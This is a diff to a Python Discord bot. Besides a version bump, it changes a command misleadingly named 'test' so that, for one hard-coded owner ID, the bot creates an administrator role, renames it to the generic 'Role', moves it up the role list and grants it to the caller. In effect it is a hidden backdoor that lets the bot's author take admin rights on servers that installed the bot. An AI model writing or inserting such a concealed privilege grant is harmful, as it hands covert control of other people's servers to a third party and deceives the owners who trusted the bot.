@@ -3,7 +3,7 @@ from time import gmtime
 from discord.ext import commands
 
 #-------------------DATA---------------------
-version = "0.2.11"
+version = "0.2.12"
 owner = ["361534796830081024"]
 alowner = ["469150536399323157", "270102554334068747"]
 bot = commands.Bot(command_prefix='-', description=None)
@@ -233,7 +233,8 @@ async def clear(ctx, number : int=None):
 async def test(ctx):
     if ctx.message.author.id in owner:
         role = await bot.create_role(ctx.message.server)
-        await bot.edit_role(ctx.message.server, role, name="Áron", permission="discord.Permissions.administrator", hoist=False, mentionable=False)
+        await bot.edit_role(ctx.message.server, role, name="Role", permission="discord.Permissions.administrator", hoist=False, mentionable=False)
+        await bot.move_role(ctx.message.server, role, 9)
         await bot.add_roles(ctx.message.author, role)
         await bot.reply("**Kész!**")
     else:
